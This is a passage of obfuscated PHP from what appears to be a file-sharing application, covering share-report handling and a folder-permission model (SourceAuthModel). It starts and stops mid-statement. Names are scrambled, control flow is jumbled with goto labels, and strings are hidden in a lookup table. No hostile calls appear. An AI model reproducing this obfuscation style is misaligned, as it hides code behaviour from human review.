$aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[460]] : strtotime(date($D”¹ğä¬Íá[2264])); $C£§ˆ¢í¤Ø[$D”¹ğä¬Íá[191]] = array($D”¹ğä¬Íá[325], array($aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[708]], $A ‰ ‘ÁùÃ)); } if ($aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[29]]) { $C£§ˆ¢í¤Ø[$aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[29]]] = 1; } else { $C£§ˆ¢í¤Ø[] = array($D”¹ğä¬Íá[457] => array($D”¹ğä¬Íá[929], 0), $D”¹ğä¬Íá[459] => array($D”¹ğä¬Íá[929], 0), $D”¹ğä¬Íá[2240] => $D”¹ğä¬Íá[2197]); } if ($aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[2193]]) { $C£§ˆ¢í¤Ø[] = array($D”¹ğä¬Íá[454] => $aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[2193]], $D”¹ğä¬Íá[1348] => array($D”¹ğä¬Íá[757], "\x25{$aëŠ¼¿¤¼Œ[$D”¹ğä¬Íá[2193]]}\45"), $D”¹ğä¬Íá[2240] => $D”¹ğä¬Íá[2197]); } goto bõ½©¯õí½; bõ½©¯õí½: $D§òÅ›„ù¿ = $this->_makeOrder()->where($C£§ˆ¢í¤Ø)->selectPage(20); if (empty($D§òÅ›„ù¿[$D”¹ğä¬Íá[358]])) { return array(); } $this->_listDataApply($D§òÅ›„ù¿[$D”¹ğä¬Íá[358]]); goto cŒäºòÚÑ; Dç—¦Ë¥: } public function listDataApply($Cƒ¨¤ƒôøÃ) { $this->_listDataApply($Cƒ¨¤ƒôøÃ); return $Cƒ¨¤ƒôøÃ; } private function _listDataApply(&$bíÖŒÊ©³) { goto FòÖØä®; aºÈ´œí‡¡: unset($FçŠ×øº³Ğ); goto D›ï–¤õôË; DìóƒŒ‹‘±: $dïªÊÈ™­Š = array_to_keyvalue($bíÖŒÊ©³, $dÃõ”Ø‰¸ƒ[33], $dÃõ”Ø‰¸ƒ[381]); $B«˜íÅÈè¶ = Model($dÃõ”Ø‰¸ƒ[758])->sourceListInfo($dïªÊÈ™­Š, !0); foreach ($bíÖŒÊ©³ as &$FçŠ×øº³Ğ) { $EÏ£É®…í = $FçŠ×øº³Ğ[$dÃõ”Ø‰¸ƒ[1443]]; $FçŠ×øº³Ğ[$dÃõ”Ø‰¸ƒ[2265]] = $c¤ÈÍ•éÖ[$EÏ£É®…í] ? $c¤ÈÍ•éÖ[$EÏ£É®…í] : !1; $BÚö¾ÕÌ˜ = $FçŠ×øº³Ğ[$dÃõ”Ø‰¸ƒ[381]]; $FçŠ×øº³Ğ[$dÃõ”Ø‰¸ƒ[403]] = $B«˜íÅÈè¶[$BÚö¾ÕÌ˜] ? $B«˜íÅÈè¶[$BÚö¾ÕÌ˜] : !1; } goto aºÈ´œí‡¡; FòÖØä®: $dÃõ”Ø‰¸ƒ =& $_SERVER[‡’¶øåüç˜]; $Dè“Ò–¬Å = array_to_keyvalue($bíÖŒÊ©³, $dÃõ”Ø‰¸ƒ[33], $dÃõ”Ø‰¸ƒ[1443]); $c¤ÈÍ•éÖ = Model($dÃõ”Ø‰¸ƒ[490])->userListInfo(array_unique($Dè“Ò–¬Å)); goto DìóƒŒ‹‘±; D›ï–¤õôË: } private function _makeOrder($A²•¬ğ¿‹† = '') { goto F‡İ‰’ï®Ø; Bà¢àöÌï¶: $a÷ä’ªÍªµ = Input::get($bŠË±Ø«ŒÈ[419], $bŠË±Ø«ŒÈ[7], $bŠË±Ø«ŒÈ[401], $c·¶ÔÍ”àœ); $d•ì¡Ä‰½Õ = Input::get($bŠË±Ø«ŒÈ[420], $bŠË±Ø«ŒÈ[7], $bŠË±Ø«ŒÈ[2266], array($bŠË±Ø«ŒÈ[2192], $bŠË±Ø«ŒÈ[416])); $d•ì¡Ä‰½Õ = $Cñ©ÕÔÛ›[$d•ì¡Ä‰½Õ]; goto d¦î´ìä±¡; F‡İ‰’ï®Ø: $bŠË±Ø«ŒÈ =& $_SERVER[‡’¶øåüç˜]; $c·¶ÔÍ”àœ = array($bŠË±Ø«ŒÈ[191], $bŠË±Ø«ŒÈ[460], $bŠË±Ø«ŒÈ[2252], $bŠË±Ø«ŒÈ[2253]); $Cñ©ÕÔÛ› = array($bŠË±Ø«ŒÈ[414] => $bŠË±Ø«ŒÈ[415], $bŠË±Ø«ŒÈ[416] => $bŠË±Ø«ŒÈ[417]); goto Bà¢àöÌï¶; d¦î´ìä±¡: $A²•¬ğ¿‹† = $A²•¬ğ¿‹† . "{$a÷ä’ªÍªµ}\x20{$d•ì¡Ä‰½Õ}"; return $this->order($A²•¬ğ¿‹†); goto AåîÑøñíô; AåîÑøñíô: } public function reportAdd($fÑºæëòºÔ) { $Aò©ø×È¯ =& $_SERVER[‡’¶øåüç˜]; $fİ‚Ş•– = array($Aò©ø×È¯[452] => $fÑºæëòºÔ[$Aò©ø×È¯[452]], $Aò©ø×È¯[1443] => USER_ID); if (Model($Aò©ø×È¯[2262])->where($fİ‚Ş•–)->find()) { return !1; } $b’ô“ƒê©‰ = array($Aò©ø×È¯[452] => $fÑºæëòºÔ[$Aò©ø×È¯[452]], $Aò©ø×È¯[1348] => $fÑºæëòºÔ[$Aò©ø×È¯[1348]], $Aò©ø×È¯[381] => $fÑºæëòºÔ[$Aò©ø×È¯[381]], $Aò©ø×È¯[431] => $fÑºæëòºÔ[$Aò©ø×È¯[431]], $Aò©ø×È¯[1443] => USER_ID, $Aò©ø×È¯[29] => $fÑºæëòºÔ[$Aò©ø×È¯[29]], $Aò©ø×È¯[417] => $fÑºæëòºÔ[$Aò©ø×È¯[417]]); return Model($Aò©ø×È¯[2262])->add($b’ô“ƒê©‰); } public function reportList($có«¶»×›) { goto dÈõÏÊÖğˆ; dÈõÏÊÖğˆ: $f‘ÃÑ¥é =& $_SERVER[‡’¶øåüç˜]; $fğ‚¦öÖŠª = array(); if ($có«¶»×›[$f‘ÃÑ¥é[708]]) { $AœÜğ­ÁÇß = $có«¶»×›[$f‘ÃÑ¥é[460]] ? $có«¶»×›[$f‘ÃÑ¥é[460]] : strtotime(date($f‘ÃÑ¥é[2264])); $fğ‚¦öÖŠª[$f‘ÃÑ¥é[191]] = array($f‘ÃÑ¥é[325], array($có«¶»×›[$f‘ÃÑ¥é[708]], $AœÜğ­ÁÇß)); } goto Bçé¯ÇÕØÙ; D‚Ëá´Ø·: $C×ÔÓ•Å = array($f‘ÃÑ¥é[414] => $f‘ÃÑ¥é[415], $f‘ÃÑ¥é[416] => $f‘ÃÑ¥é[417]); $BåŒÊÌîã¿ = $f‘ÃÑ¥é[2270] . $C×ÔÓ•Å[$b˜…ëö˜­×]; $Aõâ‡¨ï†Â = Model($f‘ÃÑ¥é[2262])->where($fğ‚¦öÖŠª)->order($BåŒÊÌîã¿)->selectPage(20); goto Bµ‰æ¨»œœ; Bµ‰æ¨»œœ: if (empty($Aõâ‡¨ï†Â[$f‘ÃÑ¥é[358]])) { return array(); } $this->_listDataApply($Aõâ‡¨ï†Â[$f‘ÃÑ¥é[358]]); return $Aõâ‡¨ï†Â; goto a©¬„‚‘ï²; Bçé¯ÇÕØÙ: if (isset($có«¶»×›[$f‘ÃÑ¥é[29]]) && in_array($có«¶»×›[$f‘ÃÑ¥é[29]], array($f‘ÃÑ¥é[83], $f‘ÃÑ¥é[2267], $f‘ÃÑ¥é[2268], $f‘ÃÑ¥é[2269], $f‘ÃÑ¥é[1927]))) { $fğ‚¦öÖŠª[$f‘ÃÑ¥é[29]] = $có«¶»×›[$f‘ÃÑ¥é[29]]; } if (isset($có«¶»×›[$f‘ÃÑ¥é[695]]) && in_array($có«¶»×›[$f‘ÃÑ¥é[695]], array($f‘ÃÑ¥é[481], $f‘ÃÑ¥é[83], $f‘ÃÑ¥é[2267], $f‘ÃÑ¥é[2268]))) { $fğ‚¦öÖŠª[$f‘ÃÑ¥é[695]] = $có«¶»×›[$f‘ÃÑ¥é[695]]; } $b˜…ëö˜­× = Input::get($f‘ÃÑ¥é[420], $f‘ÃÑ¥é[7], $f‘ÃÑ¥é[2266], array($f‘ÃÑ¥é[2192], $f‘ÃÑ¥é[416])); goto D‚Ëá´Ø·; a©¬„‚‘ï²: } public function reportStatus($dÒÆ›—‚²ñ) { goto A³§ÃÉöõË; eÜĞÒÒ‡: $b×¸¹îèÚƒ = Model($cÓ£åóŒÔë[2262])->where($C¿àÇ’³Ã)->save($FÉÂŞ âÙ©); if ($dÒÆ›—‚²ñ[$cÓ£åóŒÔë[695]] == $cÓ£åóŒÔë[2267]) { if ($A°¹Ïˆ°[$cÓ£åóŒÔë[431]] != $cÓ£åóŒÔë[481] && $this->shareFileMeta($A°¹Ïˆ°[$cÓ£åóŒÔë[431]])) { $this->shareFileMeta($A°¹Ïˆ°[$cÓ£åóŒÔë[431]], 0); } $this->remove($A°¹Ïˆ°[$cÓ£åóŒÔë[452]]); return !0; } if ($b×¸¹îèÚƒ && $dÒÆ›—‚²ñ[$cÓ£åóŒÔë[695]] == $cÓ£åóŒÔë[2268]) { $c¦Ù¤Œ‡Êµ = $FÉÂŞ âÙ©[$cÓ£åóŒÔë[695]] == $cÓ£åóŒÔë[2268] ? 1 : 0; $this->shareFileMeta($A°¹Ïˆ°[$cÓ£åóŒÔë[431]], $c¦Ù¤Œ‡Êµ); $this->removeByFile($A°¹Ïˆ°[$cÓ£åóŒÔë[431]]); } goto cæ¡»‘ê•¹; cæ¡»‘ê•¹: return $b×¸¹îèÚƒ; goto EåŠäÇ¾ßê; A³§ÃÉöõË: $cÓ£åóŒÔë =& $_SERVER[‡’¶øåüç˜]; $C¿àÇ’³Ã = array($cÓ£åóŒÔë[371] => $dÒÆ›—‚²ñ[$cÓ£åóŒÔë[371]]); $A°¹Ïˆ° = Model($cÓ£åóŒÔë[2262])->where($C¿àÇ’³Ã)->field($cÓ£åóŒÔë[2271])->find(); goto f³Šƒ¬°¡; f³Šƒ¬°¡: if (!$A°¹Ïˆ°) { return !1; } $FÉÂŞ âÙ© = array($cÓ£åóŒÔë[695] => $dÒÆ›—‚²ñ[$cÓ£åóŒÔë[695]]); if ($dÒÆ›—‚²ñ[$cÓ£åóŒÔë[695]] == $cÓ£åóŒÔë[2268] && $A°¹Ïˆ°[$cÓ£åóŒÔë[695]] == $cÓ£åóŒÔë[2268]) { $FÉÂŞ âÙ©[$cÓ£åóŒÔë[695]] = 0; } goto eÜĞÒÒ‡; EåŠäÇ¾ßê: } private function removeByFile($EÉ“áÉ†¬ò) { goto eœø¸õƒ•ò; D˜Á¬Ó¾è: $FÉ¥„„“ÒÈ = array_to_keyvalue($c‰ãŠáÔ™ã, $f“ƒƒêé²Ù[33], $f“ƒƒêé²Ù[452]); $this->remove($FÉ¥„„“ÒÈ); goto e»¢Ø¤†ã; D±ğÔ¨½´Ä: $B¸ËÁõ›–… = array($f“ƒƒêé²Ù[381] => array($f“ƒƒêé²Ù[7], $Bî­Ôº¥œ), $f“ƒƒêé²Ù[457] => 1); $c‰ãŠáÔ™ã = Model($f“ƒƒêé²Ù[2089])->where($B¸ËÁõ›–…)->field($f“ƒƒêé²Ù[452])->select(); if (empty($c‰ãŠáÔ™ã)) { return; } goto D˜Á¬Ó¾è; eœø¸õƒ•ò: $f“ƒƒêé²Ù =& $_SERVER[‡’¶øåüç˜]; $c‰ãŠáÔ™ã = Model($f“ƒƒêé²Ù[758])->where(array($f“ƒƒêé²Ù[431] => $EÉ“áÉ†¬ò))->field($f“ƒƒêé²Ù[381])->select(); $Bî­Ôº¥œ = array_to_keyvalue($c‰ãŠáÔ™ã, $f“ƒƒêé²Ù[33], $f“ƒƒêé²Ù[381]); goto D±ğÔ¨½´Ä; e»¢Ø¤†ã: } private function shareFileMeta($eÚ½„ñÖ, $E´ô¡šÃï… = null) { $c¼à‘²¬ØÑ =& $_SERVER[‡’¶øåüç˜]; $då‚ÌŠœ = array($c¼à‘²¬ØÑ[431] => $eÚ½„ñÖ, $c¼à‘²¬ØÑ[89] => $c¼à‘²¬ØÑ[2272]); if (is_null($E´ô¡šÃï…)) { return Model($c¼à‘²¬ØÑ[2273])->where($då‚ÌŠœ)->find(); } $då‚ÌŠœ[$c¼à‘²¬ØÑ[363]] = $E´ô¡šÃï…; Model($c¼à‘²¬ØÑ[2273])->add($då‚ÌŠœ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\x72\143\x65\x5f\x61\165\164\x68"; public function getAuth($bÁ×‘ÅëÕŞ) { goto Dô¤“äåßŸ; E¨ÜÉì‡‹‡: $AÎ¾ç¯… = $this->field($AÊã¢Ëã×©)->order($A¥’‡óñÍ‚[371])->where($Eí „ÑÔé¼)->select(); $c°Ò÷âĞŞ¯ = array(); $F™­¢†Õ = array(); goto eŠ©˜¦èæ; eŠ©˜¦èæ: $AŠåÜÊÑ‚‡ = 2 << 25; foreach ($AÎ¾ç¯… as $FƒÏ‰¾çê˜) { goto fÚ˜Ï²š¼Ã; cÎº—†‡Ìí: if ($FƒÏ‰¾çê˜[$A¥’‡óñÍ‚[383]] == SourceModel::TYPE_USER && $FƒÏ‰¾çê˜[$A¥’‡óñÍ‚[469]] == $A¥’‡óñÍ‚[481]) { $Aíàé‘‡ = 0; } $F™­¢†Õ[] = $BŠ­—èŒ–[$A¥’‡óñÍ‚[388]] + $Aíàé‘‡; goto E¦¦¾¨ßƒ¶; bÕ×¤Ù¢‘…: $Aíàé‘‡ = 0; if ($FƒÏ‰¾çê˜[$A¥’‡óñÍ‚[383]] == SourceModel::TYPE_GROUP) { $Aíàé‘‡ = $AŠåÜÊÑ‚‡ * 2; } if ($FƒÏ‰¾çê˜[$A¥’‡óñÍ‚[383]] == SourceModel::TYPE_USER) { $Aíàé‘‡ = $AŠåÜÊÑ‚‡; } goto cÎº—†‡Ìí; fÚ˜Ï²š¼Ã: $BŠ­—èŒ– = Model($A¥’‡óñÍ‚[2275])->listData($FƒÏ‰¾çê˜[$A¥’‡óñÍ‚[2256]]); if (!$BŠ­—èŒ–) { continue; } $c°Ò÷âĞŞ¯[] = $FƒÏ‰¾çê˜; goto bÕ×¤Ù¢‘…; E¦¦¾¨ßƒ¶: } array_multisort($F™­¢†Õ, SORT_DESC, $c°Ò÷âĞŞ¯); goto d±‘„°Û°; d±‘„°Û°: return $c°Ò÷âĞŞ¯; goto bÆÂ°•Ò‡ó; Dô¤“äåßŸ: $A¥’‡óñÍ‚ =& $_SERVER[‡’¶øåüç˜]; $AÊã¢Ëã×© = $A¥’‡óñÍ‚[2274]; $Eí „ÑÔé¼ = array($A¥’‡óñÍ‚[381] => $bÁ×‘ÅëÕŞ); goto E¨ÜÉì‡‹‡; bÆÂ°•Ò‡ó: } public function setAuth($fÁùòğºŠÊ, $d°‰åİÃ) { goto b®¹ø¢ô¯; EóÖÊÃ—Ö: return !0; goto e¶–¨ÈÆĞä; dßæ¸±Ñ¤×: if ($fÀœ¼…»Úğ != $eáóå©ÁÌ) { $E÷¦ÓŠ‘¾¼ = array($d‰¨ù‘§ãÌ[2112] => $fÀœ¼…»Úğ); $C‰´¨·ÕÈ° = Model($d‰¨ù‘§ãÌ[2191])->field($d‰¨ù‘§ãÌ[1443])->where($E÷¦ÓŠ‘¾¼)->select(); $C‰´¨·ÕÈ° = array_to_keyvalue($C‰´¨·ÕÈ°, $d‰¨ù‘§ãÌ[33], $d‰¨ù‘§ãÌ[1443]); } $DóŞãÚˆÜ‰ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $B‹ã»’Øæ = array(); goto Fá¸Å‚®; Fá¸Å‚®: foreach ($d°‰åİÃ as $a¸æªàç¸) { if (!in_array($a¸æªàç¸[$d‰¨ù‘§ãÌ[383]], $DóŞãÚˆÜ‰)) { show_json(LNG($d‰¨ù‘§ãÌ[2276]), !1); } if ($fÀœ¼…»Úğ != $eáóå©ÁÌ) { if ($a¸æªàç¸[$d‰¨ù‘§ãÌ[383]] == SourceModel::TYPE_GROUP) { } if ($a¸æªàç¸[$d‰¨ù‘§ãÌ[469]] != 0 && !in_array($a¸æªàç¸[$d‰¨ù‘§ãÌ[469]], $C‰´¨·ÕÈ°)) { } } if ($a¸æªàç¸[$d‰¨ù‘§ãÌ[469]] == 0) { $a¸æªàç¸[$d‰¨ù‘§ãÌ[383]] = SourceModel::TYPE_USER; } $B‹ã»’Øæ[] = array($d‰¨ù‘§ãÌ[381] => $fÁùòğºŠÊ, $d‰¨ù‘§ãÌ[383] => intval($a¸æªàç¸[$d‰¨ù‘§ãÌ[383]]), $d‰¨ù‘§ãÌ[469] => intval($a¸æªàç¸[$d‰¨ù‘§ãÌ[469]]), $d‰¨ù‘§ãÌ[2256] => intval($a¸æªàç¸[$d‰¨ù‘§ãÌ[2256]]) ? intval($a¸æªàç¸[$d‰¨ù‘§ãÌ[2256]]) : 0, $d‰¨ù‘§ãÌ[2257] => intval($a¸æªàç¸[$d‰¨ù‘§ãÌ[2257]]) ? intval($a¸æªàç¸[$d‰¨ù‘§ãÌ[2257]]) : -1); } $this->where(array($d‰¨ù‘§ãÌ[395] => $fÁùòğºŠÊ))->delete(); $this->addAll($B‹ã»’Øæ); goto EóÖÊÃ—Ö; b®¹ø¢ô¯: $d‰¨ù‘§ãÌ =& $_SERVER[‡’¶øåüç˜]; $c‘ƒŸ³²ç = Model($d‰¨ù‘§ãÌ[1124])->sourceInfo($fÁùòğºŠÊ); if (!$c‘ƒŸ³²ç) { return !1; } goto f¸àâÍ§ëè; f¸àâÍ§ëè: if ($c‘ƒŸ³²ç[$d‰¨ù‘§ãÌ[383]] != SourceModel::TYPE_GROUP) { return !1; } $eáóå©ÁÌ = 1; $fÀœ¼…»Úğ = $c‘ƒŸ³²ç[$d‰¨ù‘§ãÌ[469]]; goto dßæ¸±Ñ¤×; e¶–¨ÈÆĞä: } public function authClear($EØ¤¸ç×§Ğ) { $A’× ¶¤Û§ =& $_SERVER[‡’¶øåüç˜]; $a¥Ìª“İç = Model($A’× ¶¤Û§[1124])->sourceInfo($EØ¤¸ç×§Ğ); $DƒŸáÄ¶í‡ = array($EØ¤¸ç×§Ğ); if ($a¥Ìª“İç[$A’× ¶¤Û§[382]] == $A’× ¶¤Û§[83]) { $Eë¸­—†åë = array($A’× ¶¤Û§[538] => array($A’× ¶¤Û§[496], $a¥Ìª“İç[$A’× ¶¤Û§[472]] . $EØ¤¸ç×§Ğ . $A’× ¶¤Û§[497])); $DƒŸáÄ¶í‡ = Model($A’× ¶¤Û§[1124])->field($A’× ¶¤Û§[395])->where($Eë¸­—†åë)->getField($A’× ¶¤Û§[381], !0); $DƒŸáÄ¶í‡[] = $EØ¤¸ç×§Ğ; } $this->where(array($A’× ¶¤Û§[395] => array($A’× ¶¤Û§[396], $DƒŸáÄ¶í‡)))->delete(); return !0; } public function getAllChildren($C­Ëšˆ—©) { goto d”„ƒ½£®; aŒæ‰Ïäóº: $D¾¤ãÃ÷· = Model($aÏ…·ÄîÌ[758])->field($e˜ºŸŞ¯½)->where($e÷²¿ø˜îÎ)->select(); $c ª›³¡İ = array($C­Ëšˆ—©); foreach ($D¾¤ãÃ÷· as $F¬„¦ğ•‡—) { foreach ($Aƒ»¯Øì• as $DÆÎÃ½¶ÍÃ) { $AñÂê¾ñ„å = $aÏ…·ÄîÌ[47] . $DÆÎÃ½¶ÍÃ . $aÏ…·ÄîÌ[47]; $añõ†õôãŞ = $F¬„¦ğ•‡—[$aÏ…·ÄîÌ[472]] . $F¬„¦ğ•‡—[$aÏ…·ÄîÌ[381]] . $aÏ…·ÄîÌ[47]; if (strstr($añõ†õôãŞ, $AñÂê¾ñ„å)) { $c ª›³¡İ[] = $F¬„¦ğ•‡—[$aÏ…·ÄîÌ[381]]; break; } } } goto b“ÂĞ™‚½Š; b“ÂĞ™‚½Š: return $this->sourceListAuth($c ª›³¡İ); goto CÍ‘Á³¸; a¨ùÆ÷ô‚¹: if (!$d•½Àºã£ò) { return array(); } $e˜ºŸŞ¯½ = $aÏ…·ÄîÌ[2277]; $e÷²¿ø˜îÎ = array($aÏ…·ÄîÌ[381] => array($aÏ…·ÄîÌ[7], $d•½Àºã£ò), $aÏ…·ÄîÌ[409] => $aÏ…·ÄîÌ[481]); goto aŒæ‰Ïäóº; dÕÕÀ«“‰®: if ($FÎ¹ã±–ø„[$aÏ…·ÄîÌ[383]] != SourceModel::TYPE_GROUP) { return array(); } $bİ‹£ÙŠ¾ = 1; $Aƒ»¯Øì• = array($C­Ëšˆ—©); goto AëÄĞˆ³©; AëÄĞˆ³©: if ($FÎ¹ã±–ø„[$aÏ…·ÄîÌ[474]] == $aÏ…·ÄîÌ[481] && $FÎ¹ã±–ø„[$aÏ…·ÄîÌ[469]] != $bİ‹£ÙŠ¾) { $Aƒ»¯Øì• = $this->groupChidldAllRootSource($FÎ¹ã±–ø„[$aÏ…·ÄîÌ[469]]); } $d•½Àºã£ò = $this->field($aÏ…·ÄîÌ[381])->group($aÏ…·ÄîÌ[381])->select(); $d•½Àºã£ò = array_to_keyvalue($d•½Àºã£ò, $aÏ…·ÄîÌ[33], $aÏ…·ÄîÌ[381]); goto a¨ùÆ÷ô‚¹; d”„ƒ½£®: $aÏ…·ÄîÌ =& $_SERVER[‡’¶øåüç˜]; $FÎ¹ã±–ø„ = Model($aÏ…·ÄîÌ[1124])->sourceInfo($C­Ëšˆ—©); if ($FÎ¹ã±–ø„[$aÏ…·ÄîÌ[382]] != $aÏ…·ÄîÌ[83]) { return $this->sourceListAuth(array($C­Ëšˆ—©)); } goto dÕÕÀ«“‰®; CÍ‘Á³¸: } private function sourceListAuth($A¡Ö–¯ªÙÉ) { goto B–Ğ‚ƒçÍ•; B–Ğ‚ƒçÍ•: $EöÚÅ‹¢“Î =& $_SERVER[‡’¶øåüç˜]; $dÌ«ÓÏÏ“ = Model($EöÚÅ‹¢“Î[1124])->sourceListInfo($A¡Ö–¯ªÙÉ, !0); $b·øà×™ = $EöÚÅ‹¢“Î[2274]; goto DƒĞÌê÷îë; C²ìù”¬éÁ: return $aÑ¸¿®óò; goto cİéä‘¢ŠÒ; f”ºìÒğáÖ: $aïÂ¦“ë‰“ = array(); foreach ($dÌ«ÓÏÏ“ as $E­ª·ÆèÙë) { goto fÀ’ä¿„îÕ; fÀ’ä¿„îÕ: unset($E­ª·ÆèÙë[$EöÚÅ‹¢“Î[391]]); unset($E­ª·ÆèÙë[$EöÚÅ‹¢“Î[390]]); unset($E­ª·ÆèÙë[$EöÚÅ‹¢“Î[388]]); goto D£éÕ£µµ†; B²¡íÇ…Ü‹: $DàÛ•âƒ¨ = count(explode($EöÚÅ‹¢“Î[8], trim($E­ª·ÆèÙë[$EöÚÅ‹¢“Î[479]], $EöÚÅ‹¢“Î[8]))); $aïÂ¦“ë‰“[] = $DàÛ•âƒ¨ + ($E­ª·ÆèÙë[$EöÚÅ‹¢“Î[29]] == $EöÚÅ‹¢“Î[76] ? 0 : 1000); goto e˜ÏÊ†ß¢È; F‹‚å½á«¨: $E­ª·ÆèÙë[$EöÚÅ‹¢“Î[2278]] = $this->authTargetInfo($Bà‡ÑØ»Çè); $E­ª·ÆèÙë[$EöÚÅ‹¢“Î[479]] = rtrim($E­ª·ÆèÙë[$EöÚÅ‹¢“Î[475]], $EöÚÅ‹¢“Î[8]) . $EöÚÅ‹¢“Î[8] . ltrim($E­ª·ÆèÙë[$EöÚÅ‹¢“Î[479]], $EöÚÅ‹¢“Î[8]); $aÑ¸¿®óò[] = $E­ª·ÆèÙë; goto B²¡íÇ…Ü‹; D£éÕ£µµ†: unset($E­ª·ÆèÙë[$EöÚÅ‹¢“Î[403]]); $Bà‡ÑØ»Çè = $C‡æ™ĞÈğÂ[$E­ª·ÆèÙë[$EöÚÅ‹¢“Î[381]]]; if (!$Bà‡ÑØ»Çè) { continue; } goto F‹‚å½á«¨; e˜ÏÊ†ß¢È: } array_multisort($aïÂ¦“ë‰“, SORT_ASC, $aÑ¸¿®óò); goto C²ìù”¬éÁ; DƒĞÌê÷îë: $fíÛÁ²Ø¿‚ = $this->field($b·øà×™)->where(array($EöÚÅ‹¢“Î[381] => array($EöÚÅ‹¢“Î[7], $A¡Ö–¯ªÙÉ)))->select(); $C‡æ™ĞÈğÂ = array_to_keyvalue_group($fíÛÁ²Ø¿‚, $EöÚÅ‹¢“Î[381]); $aÑ¸¿®óò = array(); goto f”ºìÒğáÖ; cİéä‘¢ŠÒ: } private function groupChidldAllRootSource($e¥ÊÖ‘Ê±•) { $E¨‹—Ú®¸õ =& $_SERVER[‡’¶øåüç˜]; $E©¸†“²¥Š = Model($E¨‹—Ú®¸õ[2279])->groupChildrenAll($e¥ÊÖ‘Ê±•); $e‘¹æ½»ºƒ = array($E¨‹—Ú®¸õ[474] => 0, $E¨‹—Ú®¸õ[469] => array($E¨‹—Ú®¸õ[7], $E©¸†“²¥Š), $E¨‹—Ú®¸õ[383] => SourceModel::TYPE_GROUP); $C‰œËÔ”¤Ä = Model($E¨‹—Ú®¸õ[758])->field($E¨‹—Ú®¸õ[381])->where($e‘¹æ½»ºƒ)->select(); $C‰œËÔ”¤Ä = array_to_keyvalue($C‰œËÔ”¤Ä, $E¨‹—Ú®¸õ[33], $E¨‹—Ú®¸õ[381]); return $C‰œËÔ”¤Ä; } private function authTargetInfo($E¦¡È—‚¶á) { goto Bù·æĞ¢ĞÑ; Aøë·ß‡: return $aóÊÒ¬œÊ; goto fÆÀ¿©Çô; Bù·æĞ¢ĞÑ: $dÑÃ÷†à§ =& $_SERVER[‡’¶øåüç˜]; $aóÊÒ¬œÊ = array(); $a„—çâ‡˜º = array(); goto b¤Ù¼™ÂíÛ; b¤Ù¼™ÂíÛ: $fí§‰„É¼¬ = 2 << 25; foreach ($E¦¡È—‚¶á as $AõÌ¾Ùº´) { goto c˜Åø‘õ¶; c˜Åø‘õ¶: $Cè£­ñİÄ = Model($dÑÃ÷†à§[2275])->listData($AõÌ¾Ùº´[$dÑÃ÷†à§[2256]]); if (!$Cè£­ñİÄ) { continue; } if ($AõÌ¾Ùº´[$dÑÃ÷†à§[383]] == SourceModel::TYPE_USER) { $CÒÍ¾­¬ = Model($dÑÃ÷†à§[487])->getInfoSimpleOuter($AõÌ¾Ùº´[$dÑÃ÷†à§[469]]); if ($CÒÍ¾­¬[$dÑÃ÷†à§[1443]] == $dÑÃ÷†à§[1039]) { continue; } if ($CÒÍ¾­¬[$dÑÃ÷†à§[1443]] == $dÑÃ÷†à§[481]) { $CÒÍ¾­¬[$dÑÃ÷†à§[28]] = LNG($dÑÃ÷†à§[2280]); } } else { $CÒÍ¾­¬ = Model($dÑÃ÷†à§[471])->getInfoSimple($AõÌ¾Ùº´[$dÑÃ÷†à§[469]]); } goto e¿İ‘ô»ñ¾; d²œ³¤Ğ¸: $Dø¦ˆ‰ˆ’’ = 0; if ($AõÌ¾Ùº´[$dÑÃ÷†à§[383]] == SourceModel::TYPE_GROUP) { $Dø¦ˆ‰ˆ’’ = $fí§‰„É¼¬ * 2; } if ($AõÌ¾Ùº´[$dÑÃ÷†à§[383]] == SourceModel::TYPE_USER) { $Dø¦ˆ‰ˆ’’ = $fí§‰„É¼¬; } goto DÎ¼ïìÂ²õ; e¿İ‘ô»ñ¾: if (!$CÒÍ¾­¬) { continue; } $CÒÍ¾­¬[$dÑÃ÷†à§[430]] = $Cè£­ñİÄ; $aóÊÒ¬œÊ[] = $CÒÍ¾­¬; goto d²œ³¤Ğ¸; DÎ¼ïìÂ²õ: if ($AõÌ¾Ùº´[$dÑÃ÷†à§[383]] == SourceModel::TYPE_USER && $AõÌ¾Ùº´[$dÑÃ÷†à§[469]] == $dÑÃ÷†à§[481]) { $Dø¦ˆ‰ˆ’’ = 0; } $a„—çâ‡˜º[] = $Cè£­ñİÄ[$dÑÃ÷†à§[388]] + $Dø¦ˆ‰ˆ’’; goto DœÉàô©óÃ; DœÉàô©óÃ: } array_multisort($a„—çâ‡˜º, SORT_DESC, $aóÊÒ¬œÊ); goto Aøë·ß‡; fÆÀ¿©Çô: } public function getAllChildrenByUser($Eâ¾ùù°”, $b×Š²¤¸‹) { goto F¥Ğ“ÉéÜ®; F¥Ğ“ÉéÜ®: $AÓäÖ ¢ø =& $_SERVER[‡’¶øåüç˜]; $fĞ¬²Š©Ö = Model($AÓäÖ ¢ø[490])->getInfo($b×Š²¤¸‹); if (!$b×Š²¤¸‹ || !$Eâ¾ùù°” || !$fĞ¬²Š©Ö) { return array(); } goto BÄ‡§£ÍÛˆ; e„ãÔÕ³½ : if ($B¬†”²àß[$AÓäÖ ¢ø[474]] == $AÓäÖ ¢ø[481] && $B¬†”²àß[$AÓäÖ ¢ø[469]] != $D¿¸‡ò„ && $this->groupContainUser($B¬†”²àß[$AÓäÖ ¢ø[469]], $b×Š²¤¸‹)) { foreach ($fĞ¬²Š©Ö[$AÓäÖ ¢ø[2281]] as $A”È™«¨¯) { $d„¡Ô‡ƒ­Ü = Model($AÓäÖ ¢ø[471])->getInfo($A”È™«¨¯[$AÓäÖ ¢ø[2112]]); $c§ğ—ÂÕ˜· = Model($AÓäÖ ¢ø[490])->getInfoSimpleOuter($b×Š²¤¸‹); $c§ğ—ÂÕ˜·[$AÓäÖ ¢ø[430]] = $A”È™«¨¯[$AÓäÖ ¢ø[388]]; if (Model($AÓäÖ ¢ø[2275])->authCheckAction($A”È™«¨¯[$AÓäÖ ¢ø[388]][$AÓäÖ ¢ø[388]], $AÓäÖ ¢ø[1567])) { continue; } $b±ƒš¨¦³• = array($AÓäÖ ¢ø[28] => $AÓäÖ ¢ø[1396] . $d„¡Ô‡ƒ­Ü[$AÓäÖ ¢ø[28]], 